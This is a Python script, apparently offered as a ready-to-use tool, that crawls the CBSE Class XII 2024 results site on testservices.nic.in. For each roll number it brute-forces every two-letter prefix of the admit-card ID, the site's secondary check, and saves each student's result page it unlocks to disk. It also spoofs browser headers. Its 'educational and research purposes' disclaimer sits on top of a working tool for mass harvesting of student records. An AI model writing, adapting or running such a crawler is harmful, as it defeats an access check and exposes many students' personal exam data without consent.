import requests
import os
import argparse
from time import sleep

if not os.path.exists("Results"):
    os.makedirs("Results")

class color:
    PURPLE = "\033[95m"
    CYAN = "\033[96m"
    DARKCYAN = "\033[36m"
    BLUE = "\033[94m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"
    END = "\033[0m"
    WHITE = "\33[37m"

session = requests.Session()
artwork = (
    color.BOLD
    + color.PURPLE
    + """
______                _ _     _____                    _           
| ___ \\              | | |   /  __ \\                  | |          
| |_/ /___  ___ _   _| | |_  | /  \\/_ __ __ ___      _| | ___ _ __ 
|    // _ \\/ __| | | | | __| | |   | '__/ _` \\ \\ /\\ / / |/ _ \\ '__|
| |\\ \\  __/\\__ \\ |_| | | |_  | \\__/\\ | | (_| |\\ V  V /| |  __/ |   
\\_| \\_\\___||___/\\__,_|_|\\__|  \\____/_|  \\__,_| \\_/\\_/ |_|\\___|_|  
{0} Disclaimer - This tool is developed for educational and research purposes only.
{0} It is not intended to compromise privacy or security.
{0} Please use responsibly and respect all applicable laws and regulations.
""".format(
        color.BLUE
    )
)
print(artwork)

def parse_args():
    parser = argparse.ArgumentParser(description="CBSE Result Crawler")
    parser.add_argument("-s", "--start", type=int, help="Starting roll number")
    parser.add_argument("-e", "--end", type=int, help="Ending roll number (exclusive)")
    parser.add_argument("-c", "--code", dest="sklcode", help="School Code")
    parser.add_argument("-n", "--center", dest="centNo", help="Center code")
    parser.add_argument("--admid-pattern", type=str, default="{prefix1}{prefix2}{rno_suffix}{sklcode_prefix}{centno_suffix}",
                        help="Pattern for admid (default: '{prefix1}{prefix2}{rno_suffix}{sklcode_prefix}{centno_suffix}')")
    parser.add_argument("--prefix1", type=str, default="ABCDEFGHIJKLMNOPQRSTUVWXYZ", help="First prefix set for admid")
    parser.add_argument("--prefix2", type=str, default="ABCDEFGHIJKLMNOPQRSTUVWXYZ", help="Second prefix set for admid")
    parser.add_argument("--delay", type=float, default=0.5, help="Delay between requests (seconds)")
    parser.add_argument("--extra-fields", nargs='*', default=[], help="Extra POST fields as key=value")
    args = parser.parse_args()
    return args

def wizard():
    print(color.YELLOW + "[*] Interactive mode" + color.END)
    start = int(input(color.GREEN + "[~] " + color.WHITE + "Start value: "))
    end = int(input(color.GREEN + "[~] " + color.WHITE + "Stop value: "))
    sklcode = input(color.GREEN + "[~] " + color.WHITE + "School code: ")
    centNo = input(color.GREEN + "[~] " + color.WHITE + "Center code: ")
    return start, end, sklcode, centNo

headers = {
    "Host": "testservices.nic.in",
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Referer": "https://testservices.nic.in/",
    "Origin": "https://testservices.nic.in",
    "DNT": "1",
}

def parse_extra_fields(extra_fields):
    result = {}
    for item in extra_fields:
        if '=' in item:
            k, v = item.split('=', 1)
            result[k] = v
    return result

def req(rno, sklcode, centNo, admid_pattern, prefix1, prefix2, extra_fields):
    found = False
    for i in prefix1:
        for j in prefix2:
            admid = admid_pattern.format(
                prefix1=i,
                prefix2=j,
                rno_suffix=str(rno)[-2:],
                sklcode_prefix=sklcode[:2],
                centno_suffix=centNo[-2:]
            )
            payload = {
                "regno": rno,
                "sch": sklcode,
                "admid": admid,
                "B2": "Submit",
            }
            payload.update(extra_fields)
            try:
                q = session.post(
                    "https://testservices.nic.in/cbseresults/class_xii_a_2024/ClassTwelfth_c_2024.asp",
                    data=payload,
                    headers=headers,
                    timeout=10
                )
            except requests.RequestException as ex:
                print(f"{color.RED}[!] Network error for {rno}: {ex}{color.END}")
                return False

            if "Result Not Found" not in q.text:
                with open(f"Results/{rno}.htm", "w", encoding="utf-8") as f:
                    f.write(q.text)
                print(f"{color.GREEN}Found: {color.WHITE}[{rno}]{color.END}")
                found = True
                break
        if found:
            break
    if not found:
        print(f"{color.YELLOW}Not found: {rno}{color.END}")
    return found

def main():
    args = parse_args()
    if not (args.start and args.end and args.sklcode and args.centNo):
        args.start, args.end, args.sklcode, args.centNo = wizard()

    extra_fields = parse_extra_fields(args.extra_fields)
    total = args.end - args.start
    found_count = 0
    for idx, rno in enumerate(range(args.start, args.end), 1):
        result_file = f"Results/{rno}.htm"
        if os.path.exists(result_file):
            print(f"{color.CYAN}{rno} already in list{color.END}")
            continue
        print(f"{color.BLUE}[{idx}/{total}] Checking roll {rno}...{color.END}")
        if req(
            rno, args.sklcode, args.centNo,
            args.admid_pattern, args.prefix1, args.prefix2, extra_fields
        ):
            found_count += 1
        sleep(args.delay)  # Be polite to the server

    print(f"{color.BOLD}{color.GREEN}Done. Found {found_count} results out of {total}.{color.END}")

if __name__ == "__main__":
    main()
